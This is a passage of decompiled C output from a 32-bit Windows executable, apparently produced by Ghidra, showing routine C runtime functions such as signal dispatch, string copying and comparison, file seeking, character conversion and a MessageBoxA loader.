    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_00422dcc * 0xc + param_3);
  if ((DAT_00422dcc * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_00414f32(void)

{
  FUN_0040cb6e(DAT_00424434);
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 FUN_00414f3f(void)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 extraout_ECX;
  int unaff_EBP;
  int *piVar5;
  undefined (*pauVar6) [16];
  
  FUN_0040d634(&DAT_004207a8,0x20);
  pauVar6 = (undefined (*) [16])0x0;
  *(undefined4 *)(unaff_EBP + -0x1c) = 0;
  *(undefined4 *)(unaff_EBP + -0x28) = 0;
  iVar1 = *(int *)(unaff_EBP + 8);
  if (iVar1 < 0xc) {
    if (iVar1 != 0xb) {
      if (iVar1 == 2) {
        piVar5 = &DAT_0042442c;
        iVar4 = DAT_0042442c;
        goto LAB_00414ff4;
      }
      if (iVar1 != 4) {
        if (iVar1 == 6) goto LAB_00414fd2;
        if (iVar1 != 8) goto LAB_00414fb6;
      }
    }
    pauVar6 = FUN_0040cd41();
    *(undefined (**) [16])(unaff_EBP + -0x28) = pauVar6;
    if (pauVar6 == (undefined (*) [16])0x0) {
      return 0xffffffff;
    }
    uVar2 = FUN_00414efb(extraout_ECX,iVar1,*(uint *)(pauVar6[5] + 0xc));
    piVar5 = (int *)(uVar2 + 8);
    iVar4 = *piVar5;
  }
  else {
    if (iVar1 == 0xf) {
      piVar5 = &DAT_00424438;
      iVar4 = DAT_00424438;
    }
    else if (iVar1 == 0x15) {
      piVar5 = &DAT_00424430;
      iVar4 = DAT_00424430;
    }
    else {
      if (iVar1 != 0x16) {
LAB_00414fb6:
        puVar3 = (undefined4 *)FUN_0040caaa();
        *puVar3 = 0x16;
        FUN_0040ca42();
        return 0xffffffff;
      }
LAB_00414fd2:
      piVar5 = &DAT_00424434;
      iVar4 = DAT_00424434;
    }
LAB_00414ff4:
    *(undefined4 *)(unaff_EBP + -0x1c) = 1;
    iVar4 = FUN_0040cb6e(iVar4);
  }
  *(int *)(unaff_EBP + -0x20) = iVar4;
  iVar4 = 0;
  if (*(int *)(unaff_EBP + -0x20) == 1) {
    return 0;
  }
  if (*(int *)(unaff_EBP + -0x20) == 0) {
    iVar4 = FUN_0040ee32(3);
  }
  if (*(int *)(unaff_EBP + -0x1c) != iVar4) {
    FUN_0040e055(iVar4);
  }
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (((iVar1 == 8) || (iVar1 == 0xb)) || (iVar1 == 4)) {
    *(undefined4 *)(unaff_EBP + -0x2c) = *(undefined4 *)pauVar6[6];
    *(undefined4 *)pauVar6[6] = 0;
    if (iVar1 == 8) {
      *(undefined4 *)(unaff_EBP + -0x30) = *(undefined4 *)(pauVar6[6] + 4);
      *(undefined4 *)(pauVar6[6] + 4) = 0x8c;
      goto LAB_00415058;
    }
  }
  else {
LAB_00415058:
    if (iVar1 == 8) {
      *(int *)(unaff_EBP + -0x24) = DAT_00422dc0;
      while (*(int *)(unaff_EBP + -0x24) < DAT_00422dc4 + DAT_00422dc0) {
        *(undefined4 *)(*(int *)(unaff_EBP + -0x24) * 0xc + 8 + *(int *)(pauVar6[5] + 0xc)) = 0;
        *(int *)(unaff_EBP + -0x24) = *(int *)(unaff_EBP + -0x24) + 1;
      }
      goto LAB_00415092;
    }
  }
  iVar4 = FUN_0040cb65();
  *piVar5 = iVar4;
LAB_00415092:
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_004150b3();
  if (iVar1 == 8) {
    (**(code **)(unaff_EBP + -0x20))(8,*(undefined4 *)(pauVar6[6] + 4));
  }
  else {
    (**(code **)(unaff_EBP + -0x20))(iVar1);
    if ((iVar1 != 0xb) && (iVar1 != 4)) {
      return 0;
    }
  }
  *(undefined4 *)pauVar6[6] = *(undefined4 *)(unaff_EBP + -0x2c);
  if (iVar1 == 8) {
    *(undefined4 *)(pauVar6[6] + 4) = *(undefined4 *)(unaff_EBP + -0x30);
  }
  return 0;
}



void FUN_004150b3(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040df7b(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004150ef(undefined4 param_1)

{
  _DAT_00424440 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004150fe(undefined4 param_1)

{
  _DAT_0042444c = param_1;
  return;
}



undefined4 __cdecl FUN_0041510d(undefined4 param_1,undefined4 param_2,uint param_3)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined4 uVar6;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = FUN_0040cb65();
  local_8 = 0;
  if (DAT_00424450 == 0) {
    hModule = LoadLibraryA(s_USER32_DLL_0041cbc4);
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,s_MessageBoxA_0041cbb8);
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_00424450 = FUN_0040caf3((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetActiveWindow_0041cba8);
    DAT_00424454 = FUN_0040caf3((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetLastActivePopup_0041cb94);
    DAT_00424458 = FUN_0040caf3((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetUserObjectInformationA_0041cb78);
    DAT_00424460 = FUN_0040caf3((int)pFVar2);
    if (DAT_00424460 != 0) {
      pFVar2 = GetProcAddress(hModule,s_GetProcessWindowStation_0041cb60);
      DAT_0042445c = FUN_0040caf3((int)pFVar2);
    }
  }
  if ((DAT_0042445c != iVar1) && (DAT_00424460 != iVar1)) {
    pcVar3 = (code *)FUN_0040cb6e(DAT_0042445c);
    pcVar4 = (code *)FUN_0040cb6e(DAT_00424460);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      param_3 = param_3 | 0x200000;
      goto LAB_0041524f;
    }
  }
  if ((((DAT_00424454 != iVar1) &&
       (pcVar3 = (code *)FUN_0040cb6e(DAT_00424454), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_00424458 != iVar1 && (pcVar3 = (code *)FUN_0040cb6e(DAT_00424458), pcVar3 != (code *)0x0)
      ))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_0041524f:
  pcVar3 = (code *)FUN_0040cb6e(DAT_00424450);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  uVar6 = (*pcVar3)(local_8,param_1,param_2,param_3);
  return uVar6;
}



undefined4 __cdecl FUN_00415276(char *param_1,int param_2,char *param_3,int param_4)

{
  char cVar1;
  undefined4 *puVar2;
  char *pcVar3;
  int iVar4;
  undefined4 uStack_14;
  
  if (param_4 == 0) {
    if (param_1 == (char *)0x0) {
      if (param_2 == 0) {
        return 0;
      }
    }
    else {
LAB_0041529c:
      if (param_2 != 0) {
        if (param_4 == 0) {
          *param_1 = '\0';
          return 0;
        }
        if (param_3 != (char *)0x0) {
          pcVar3 = param_1;
          iVar4 = param_2;
          if (param_4 == -1) {
            do {
              cVar1 = *param_3;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              param_3 = param_3 + 1;
              if (cVar1 == '\0') break;
              iVar4 = iVar4 + -1;
            } while (iVar4 != 0);
          }
          else {
            do {
              cVar1 = *param_3;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              param_3 = param_3 + 1;
              if ((cVar1 == '\0') || (iVar4 = iVar4 + -1, iVar4 == 0)) break;
              param_4 = param_4 + -1;
            } while (param_4 != 0);
            if (param_4 == 0) {
              *pcVar3 = '\0';
            }
          }
          if (iVar4 != 0) {
            return 0;
          }
          if (param_4 == -1) {
            param_1[param_2 + -1] = '\0';
            return 0x50;
          }
          *param_1 = '\0';
          puVar2 = (undefined4 *)FUN_0040caaa();
          uStack_14 = 0x22;
          *puVar2 = 0x22;
          goto LAB_004152ad;
        }
        *param_1 = '\0';
      }
    }
  }
  else if (param_1 != (char *)0x0) goto LAB_0041529c;
  puVar2 = (undefined4 *)FUN_0040caaa();
  uStack_14 = 0x16;
  *puVar2 = 0x16;
LAB_004152ad:
  FUN_0040ca42();
  return uStack_14;
}



char * __cdecl FUN_00415330(uint *param_1)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)param_1 & 3;
  puVar3 = param_1;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00415393;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (char *)((int)puVar4 - (int)param_1);
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (char *)((int)puVar4 + (1 - (int)param_1));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (char *)((int)puVar4 + (2 - (int)param_1));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00415393:
  return (char *)((int)puVar3 + (-1 - (int)param_1));
}



undefined4 __cdecl FUN_004153bb(int param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  if (-1 < param_1) {
    if (param_1 < 3) {
      uVar2 = DAT_004239d8;
      DAT_004239d8 = param_1;
      return uVar2;
    }
    if (param_1 == 3) {
      return DAT_004239d8;
    }
  }
  puVar1 = (undefined4 *)FUN_0040caaa();
  *puVar1 = 0x16;
  FUN_0040ca42();
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00415406(undefined4 *param_1)

{
  LPVOID pvVar1;
  
  _DAT_00423d18 = _DAT_00423d18 + 1;
  pvVar1 = FUN_00413b52(0x1000);
  param_1[2] = pvVar1;
  if (pvVar1 == (LPVOID)0x0) {
    param_1[3] = param_1[3] | 4;
    param_1[2] = param_1 + 5;
    param_1[6] = 2;
  }
  else {
    param_1[3] = param_1[3] | 8;
    param_1[6] = 0x1000;
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return;
}



undefined8 __cdecl FUN_0041544f(uint param_1,LONG param_2,LONG param_3,DWORD param_4)

{
  byte *pbVar1;
  HANDLE hFile;
  undefined4 *puVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG local_8;
  
  local_8 = param_3;
  hFile = (HANDLE)FUN_00414a6e(param_1);
  if (hFile == (HANDLE)0xffffffff) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
LAB_00415480:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,param_2,&local_8,param_4);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        FUN_0040cad0(DVar4);
        goto LAB_00415480;
      }
    }
    pbVar1 = (byte *)((&DAT_004257c0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined8 FUN_004154d4(void)

{
  uint uVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  int unaff_EBP;
  int iVar5;
  undefined8 uVar6;
  
  FUN_0040d634(&DAT_004207c8,0x14);
  *(undefined4 *)(unaff_EBP + -0x24) = 0xffffffff;
  *(undefined4 *)(unaff_EBP + -0x20) = 0xffffffff;
  uVar1 = *(uint *)(unaff_EBP + 8);
  if (uVar1 == 0xfffffffe) {
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
  }
  else {
    if ((-1 < (int)uVar1) && (uVar1 < DAT_004257ac)) {
      iVar5 = (uVar1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar5) & 1) == 0) {
        puVar2 = (undefined4 *)FUN_0040cabd();
        *puVar2 = 0;
        puVar2 = (undefined4 *)FUN_0040caaa();
        *puVar2 = 9;
        FUN_0040ca42();
        uVar4 = 0xffffffff;
        uVar3 = 0xffffffff;
      }
      else {
        FUN_00414ae5();
        *(undefined4 *)(unaff_EBP + -4) = 0;
        if ((*(byte *)((&DAT_004257c0)[(int)uVar1 >> 5] + 4 + iVar5) & 1) == 0) {
          puVar2 = (undefined4 *)FUN_0040caaa();
          *puVar2 = 9;
          puVar2 = (undefined4 *)FUN_0040cabd();
          *puVar2 = 0;
          *(undefined4 *)(unaff_EBP + -0x24) = 0xffffffff;
          *(undefined4 *)(unaff_EBP + -0x20) = 0xffffffff;
        }
        else {
          uVar6 = FUN_0041544f(*(uint *)(unaff_EBP + 8),*(LONG *)(unaff_EBP + 0xc),
                               *(LONG *)(unaff_EBP + 0x10),*(DWORD *)(unaff_EBP + 0x14));
          *(undefined8 *)(unaff_EBP + -0x24) = uVar6;
        }
        *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
        FUN_004155e3();
        uVar3 = *(undefined4 *)(unaff_EBP + -0x24);
        uVar4 = *(undefined4 *)(unaff_EBP + -0x20);
      }
      goto LAB_004155dd;
    }
    puVar2 = (undefined4 *)FUN_0040cabd();
    *puVar2 = 0;
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    FUN_0040ca42();
  }
  uVar3 = 0xffffffff;
  uVar4 = 0xffffffff;
LAB_004155dd:
  return CONCAT44(uVar4,uVar3);
}



void FUN_004155e3(void)

{
  int unaff_EBP;
  
  FUN_00414b85(*(uint *)(unaff_EBP + 8));
  return;
}



void __cdecl FUN_004155ed(undefined (*param_1) [16],uint param_2)

{
  uint uVar1;
  
  uVar1 = param_2 >> 7;
  do {
    *param_1 = (undefined  [16])0x0;
    param_1[1] = (undefined  [16])0x0;
    param_1[2] = (undefined  [16])0x0;
    param_1[3] = (undefined  [16])0x0;
    param_1[4] = (undefined  [16])0x0;
    param_1[5] = (undefined  [16])0x0;
    param_1[6] = (undefined  [16])0x0;
    param_1[7] = (undefined  [16])0x0;
    param_1 = param_1 + 8;
    uVar1 = uVar1 - 1;
  } while (uVar1 != 0);
  return;
}



undefined (*) [16] __cdecl FUN_00415644(undefined (*param_1) [16],undefined4 param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  undefined *puVar4;
  undefined (*pauVar5) [16];
  
  uVar2 = (int)param_1 >> 0x1f;
  iVar3 = (((uint)param_1 ^ uVar2) - uVar2 & 0xf ^ uVar2) - uVar2;
  if (iVar3 == 0) {
    uVar2 = param_3 & 0x7f;
    if (param_3 != uVar2) {
      FUN_004155ed(param_1,param_3 - uVar2);
    }
    if (uVar2 != 0) {
      puVar4 = (undefined *)((int)param_1 + (param_3 - uVar2));
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
    }
  }
  else {
    iVar3 = 0x10 - iVar3;
    pauVar5 = param_1;
    for (iVar1 = iVar3; iVar1 != 0; iVar1 = iVar1 + -1) {
      (*pauVar5)[0] = 0;
      pauVar5 = (undefined (*) [16])(*pauVar5 + 1);
    }
    FUN_00415644((undefined (*) [16])((int)param_1 + iVar3),0,param_3 - iVar3);
  }
  return param_1;
}



byte __cdecl FUN_004156d3(uint param_1)

{
  byte bVar1;
  undefined4 *puVar2;
  
  if (param_1 == 0xfffffffe) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    return 0;
  }
  if (((int)param_1 < 0) || (DAT_004257ac <= param_1)) {
    puVar2 = (undefined4 *)FUN_0040caaa();
    *puVar2 = 9;
    FUN_0040ca42();
    bVar1 = 0;
  }
  else {
    bVar1 = *(byte *)((&DAT_004257c0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x40) & 0x40;
  }
  return bVar1;
}



void __fastcall FUN_00415737(undefined4 param_1,undefined4 param_2,undefined2 param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  UINT CodePage;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  LPCWSTR lpWideCharStr;
  int cchWideChar;
  CHAR *lpMultiByteStr;
  int cbMultiByte;
  LPCSTR lpDefaultChar;
  LPBOOL lpUsedDefaultChar;
  DWORD local_14;
  CHAR local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_00422e10 != 0) {
    if (DAT_00422f48 == (HANDLE)0xfffffffe) {
      FUN_00417070();
      param_2 = extraout_EDX;
    }
    if (DAT_00422f48 == (HANDLE)0xffffffff) goto LAB_004157e3;
    BVar1 = WriteConsoleW(DAT_00422f48,&param_3,1,&local_14,(LPVOID)0x0);
    param_2 = extraout_EDX_00;
    if (BVar1 != 0) {
      DAT_00422e10 = 1;
      goto LAB_004157e3;
    }
    if ((DAT_00422e10 != 2) || (DVar2 = GetLastError(), param_2 = extraout_EDX_01, DVar2 != 0x78))
    goto LAB_004157e3;
    DAT_00422e10 = 0;
  }
  lpUsedDefaultChar = (LPBOOL)0x0;
  lpDefaultChar = (LPCSTR)0x0;
  cbMultiByte = 5;
  lpMultiByteStr = local_10;
  cchWideChar = 1;
  lpWideCharStr = &param_3;
  DVar2 = 0;
  CodePage = GetConsoleOutputCP();
  DVar2 = WideCharToMultiByte(CodePage,DVar2,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  param_2 = extraout_EDX_02;
  if (DAT_00422f48 != (HANDLE)0xffffffff) {
    WriteConsoleA(DAT_00422f48,local_10,DVar2,&local_14,(LPVOID)0x0);
    param_2 = extraout_EDX_03;
  }
LAB_004157e3:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



undefined4 __cdecl
FUN_004157fc(LPWSTR param_1,byte *param_2,uint param_3,undefined (**param_4) [16])

{
  undefined4 uVar1;
  ushort uVar2;
  undefined2 extraout_var;
  int iVar3;
  undefined4 *puVar4;
  undefined (*local_14 [2]) [16];
  int local_c;
  char local_8;
  
  if ((param_2 != (byte *)0x0) && (param_3 != 0)) {
    if (*param_2 != 0) {
      FUN_0040b970(local_14,param_4);
      if (*(int *)(local_14[0][1] + 4) != 0) {
        uVar2 = FUN_0041592d(*param_2,local_14);
        if (CONCAT22(extraout_var,uVar2) == 0) {
          iVar3 = MultiByteToWideChar(*(UINT *)(*local_14[0] + 4),9,(LPCSTR)param_2,1,param_1,
                                      (uint)(param_1 != (LPWSTR)0x0));
          if (iVar3 != 0) goto LAB_0041584b;
        }
        else {
          iVar3 = *(int *)(local_14[0][10] + 0xc);
          if ((((1 < iVar3) && (iVar3 <= (int)param_3)) &&
              (iVar3 = MultiByteToWideChar(*(UINT *)(*local_14[0] + 4),9,(LPCSTR)param_2,iVar3,
                                           param_1,(uint)(param_1 != (LPWSTR)0x0)), iVar3 != 0)) ||
             ((*(uint *)(local_14[0][10] + 0xc) <= param_3 && (param_2[1] != 0)))) {
            uVar1 = *(undefined4 *)(local_14[0][10] + 0xc);
            if (local_8 == '\0') {
              return uVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return uVar1;
          }
        }
        puVar4 = (undefined4 *)FUN_0040caaa();
        *puVar4 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return 0xffffffff;
      }
      if (param_1 != (LPWSTR)0x0) {
        *param_1 = (ushort)*param_2;
      }
LAB_0041584b:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (param_1 != (LPWSTR)0x0) {
      *param_1 = L'\0';
    }
  }
  return 0;
}



void __cdecl FUN_00415913(LPWSTR param_1,byte *param_2,uint param_3)

{
  FUN_004157fc(param_1,param_2,param_3,(undefined (**) [16])0x0);
  return;
}



ushort __cdecl FUN_0041592d(byte param_1,undefined (**param_2) [16])

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  FUN_0040b970(local_14,param_2);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (uint)param_1 * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



void __cdecl FUN_00415965(byte param_1)

{
  FUN_0041592d(param_1,(undefined (**) [16])0x0);
  return;
}



// WARNING: This is an inlined function

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack_4 [4];
  
  puVar2 = (undefined4 *)((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(&stack0x00000000 < in_EAX))
  ;
  for (puVar1 = (undefined4 *)((uint)auStack_4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



void __fastcall FUN_004159ab(undefined4 param_1,undefined4 param_2,WCHAR param_3,WCHAR **param_4)

{
  WCHAR **ppWVar1;
  int iVar2;
  uint uVar3;
  undefined *puVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined8 uVar5;
  int local_14;
  byte local_10 [8];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)(param_4 + 3) & 0x40) == 0) {
    iVar2 = FUN_0040dac0((int)param_4);
    param_2 = extraout_EDX;
    if ((iVar2 == -1) ||
       (iVar2 = FUN_0040dac0((int)param_4), param_2 = extraout_EDX_00, iVar2 == -2)) {
      puVar4 = &DAT_00422448;
    }
    else {
      iVar2 = FUN_0040dac0((int)param_4);
      uVar3 = FUN_0040dac0((int)param_4);
      puVar4 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_004257c0)[iVar2 >> 5]);
      param_2 = extraout_EDX_01;
    }
    if ((puVar4[0x24] & 0x7f) != 2) {
      iVar2 = FUN_0040dac0((int)param_4);
      param_2 = extraout_EDX_02;
      if ((iVar2 == -1) ||
         (iVar2 = FUN_0040dac0((int)param_4), param_2 = extraout_EDX_03, iVar2 == -2)) {
        puVar4 = &DAT_00422448;
      }
      else {
        iVar2 = FUN_0040dac0((int)param_4);
        uVar3 = FUN_0040dac0((int)param_4);
        puVar4 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_004257c0)[iVar2 >> 5]);
        param_2 = extraout_EDX_04;
      }
      if ((puVar4[0x24] & 0x7f) != 1) {
        iVar2 = FUN_0040dac0((int)param_4);
        param_2 = extraout_EDX_05;
        if ((iVar2 == -1) ||
           (iVar2 = FUN_0040dac0((int)param_4), param_2 = extraout_EDX_06, iVar2 == -2)) {
          puVar4 = &DAT_00422448;
        }
        else {
          iVar2 = FUN_0040dac0((int)param_4);
          uVar3 = FUN_0040dac0((int)param_4);
          puVar4 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_004257c0)[iVar2 >> 5]);
          param_2 = extraout_EDX_07;
        }
        if ((puVar4[4] & 0x80) != 0) {
          uVar5 = FUN_0041677a(&local_14,(undefined (*) [16])local_10,5,param_3);
          param_2 = (undefined4)((ulonglong)uVar5 >> 0x20);
          if (((int)uVar5 == 0) && (iVar2 = 0, 0 < local_14)) {
            do {
              ppWVar1 = param_4 + 1;
              *ppWVar1 = (WCHAR *)((int)*ppWVar1 + -1);
              if ((int)*ppWVar1 < 0) {
                uVar3 = FUN_0040fad4(local_10[iVar2],(int *)param_4);
                param_2 = extraout_EDX_08;
              }
              else {
                *(byte *)*param_4 = local_10[iVar2];
                uVar3 = (uint)*(byte *)*param_4;
                *param_4 = (WCHAR *)((int)*param_4 + 1);
              }
            } while ((uVar3 != 0xffffffff) && (iVar2 = iVar2 + 1, iVar2 < local_14));
          }
          goto LAB_00415b23;
        }
      }
    }
  }
  ppWVar1 = param_4 + 1;
  *ppWVar1 = *ppWVar1 + -1;
  if ((int)*ppWVar1 < 0) {
    FUN_004170bc(param_3,(int *)param_4);
    param_2 = extraout_EDX_09;
  }
  else {
    **param_4 = param_3;
    *param_4 = *param_4 + 1;
  }
LAB_00415b23:
  FUN_0040a982(local_8 ^ (uint)&stack0xfffffffc,param_2);
  return;
}



bool FUN_00415b32(void)

{
  return DAT_00424464 == (DAT_00422044 | 1);
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

void FUN_00415b48(void)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  int *piVar5;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_004207e8,0xc);
  FUN_0040e055(0xe);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  piVar3 = DAT_0042446c;
  iVar1 = *(int *)(unaff_EBP + 8);
  iVar2 = *(int *)(iVar1 + 4);
  if (iVar2 != 0) {
    piVar4 = (int *)&DAT_00424468;
    do {
      piVar5 = piVar4;
      *(int **)(unaff_EBP + -0x1c) = piVar3;
      if (piVar3 == (int *)0x0) goto LAB_00415b8c;
      piVar4 = piVar3;
    } while (*piVar3 != iVar2);
    piVar5[1] = piVar3[1];
    FUN_0040b61e();
LAB_00415b8c:
    FUN_0040b61e();
    *(undefined4 *)(iVar1 + 4) = 0;
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xfffffffe;
  FUN_00415baf();
  return;
}



void FUN_00415baf(void)

{
  FUN_0040df7b(0xe);
  return;
}



int __cdecl FUN_00415bc0(undefined4 *param_1,byte *param_2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)param_1 & 3) != 0) {
    if (((uint)param_1 & 1) != 0) {
      bVar4 = *(byte *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      bVar5 = bVar4 < *param_2;
      if (bVar4 != *param_2) goto LAB_00415c04;
      param_2 = param_2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)param_1 & 2) == 0) goto LAB_00415bd0;
    }
    uVar1 = *(undefined2 *)param_1;
    param_1 = (undefined4 *)((int)param_1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < *param_2;
    if (bVar4 != *param_2) goto LAB_00415c04;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < param_2[1];
    if (bVar4 != param_2[1]) goto LAB_00415c04;
    if (bVar4 == 0) {
      return 0;
    }
    param_2 = param_2 + 2;
  }
LAB_00415bd0:
  while( true ) {
    uVar2 = *param_1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < *param_2;
    if (bVar4 != *param_2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < param_2[1];
    if (bVar4 != param_2[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < param_2[2];
    if (bVar4 != param_2[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < param_2[3];
    if (bVar3 != param_2[3]) break;
    param_2 = param_2 + 4;
    param_1 = param_1 + 1;
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_00415c04:
  return (uint)bVar5 * -2 + 1;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

SIZE_T FUN_00415c48(void)

{
  LPCVOID lpMem;
  undefined4 *puVar1;
  SIZE_T SVar2;
  uint uVar3;
  int unaff_EBP;
  
  FUN_0040d634(&DAT_00420808,0x10);
  lpMem = *(LPCVOID *)(unaff_EBP + 8);
  if (lpMem == (LPCVOID)0x0) {
    puVar1 = (undefined4 *)FUN_0040caaa();
    *puVar1 = 0x16;
    FUN_0040ca42();
    SVar2 = 0xffffffff;
  }
  else {
    if (DAT_00425790 == 3) {
      FUN_0040e055(4);
      *(undefined4 *)(unaff_EBP + -4) = 0;
      uVar3 = FUN_0040e088((int)lpMem);
      *(uint *)(unaff_EBP + -0x20) = uVar3;
      if (uVar3 == 0) {
        SVar2 = *(SIZE_T *)(unaff_EBP + -0x1c);
      }
      else {
        SVar2 = *(int *)((int)lpMem + -4) - 9;
        *(SIZE_T *)(unaff_EBP + -0x1c) = SVar2;
      }
